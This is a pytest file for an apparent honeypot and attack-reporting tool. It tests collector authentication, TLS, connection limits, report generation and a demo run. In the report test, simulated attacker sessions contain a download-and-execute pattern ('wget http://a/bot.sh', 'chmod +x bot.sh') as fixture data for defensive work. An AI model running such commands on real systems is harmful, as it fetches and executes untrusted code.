import asyncio, json, ssl, subprocess, tempfile, urllib.error, urllib.request
import pytest
from nexus_shield import honeypot, report, sdr
from nexus_shield.collector import Collector
from nexus_shield.store import Store
from nexus_shield.demo import run
from tests.helpers import ev

def post(c, path, tok, data):
    r = urllib.request.Request(c.url + path, json.dumps(data).encode(), {"X-Token": tok})
    return urllib.request.urlopen(r).status

def test_collector_auth_validation_persistence():
    db = tempfile.mktemp(); c = Collector(token="t", db=db).start()
    try:
        assert post(c, "/events", "t", {"ts": 1, "node": "n", "src": "1.1.1.1:1", "payloads": ["x"]}) == 200
        for tok, data, code in (("bad", {}, 401), ("t", {"bogus": 1}, 400)):
            with pytest.raises(urllib.error.HTTPError) as e: post(c, "/events", tok, data)
            assert e.value.code == code
        assert len(c.events) == 1
    finally: c.stop()
    assert len(Store(db).events()) == 1          # survives restart

def test_tls_collector():
    d = tempfile.mkdtemp()
    r = subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", d + "/k.pem", "-out", d + "/c.pem",
                        "-days", "1", "-subj", "/CN=localhost", "-addext", "subjectAltName=IP:127.0.0.1"], capture_output=True)
    if r.returncode: pytest.skip("openssl unavailable")
    c = Collector(token="t", certfile=d + "/c.pem", keyfile=d + "/k.pem").start()
    try:
        assert c.url.startswith("https")
        assert honeypot._http(c.url + "/healthz", "t", cafile=d + "/c.pem") == {"ok": True}
        with pytest.raises(Exception): honeypot._http(c.url + "/healthz", "t")      # untrusted cert rejected
    finally: c.stop()

def test_connection_cap_and_limits():
    async def go():
        srv = await honeypot.start(port=0, max_conn=1)
        port = srv.sockets[0].getsockname()[1]
        r1, w1 = await asyncio.open_connection("127.0.0.1", port); await r1.read(5)
        r2, w2 = await asyncio.open_connection("127.0.0.1", port)
        assert await asyncio.wait_for(r2.read(100), 2) == b""        # second connection dropped
        w1.close(); srv.close()
    asyncio.run(go())

def test_report():
    evs = [ev(["root", "wget http://a/bot.sh", "chmod +x bot.sh"], ts=i * 2.0, ip="1.1.1.%d" % i) for i in range(4)]
    obs = [sdr.Obs(e.ts, 0, -10, 1000) for e in evs]
    r = report.build(evs, obs)
    md = report.to_markdown(r)
    assert r["sessions"] == 4 and "emitter-0" in md and "<script" not in report.to_html(r)

def test_live_demo_end_to_end():
    assert asyncio.run(run(out=lambda *_: None)) == {"attribution_ok": True, "variant_detected": True,
                                                    "benign_false_tags": 0, "vaccines": 2}
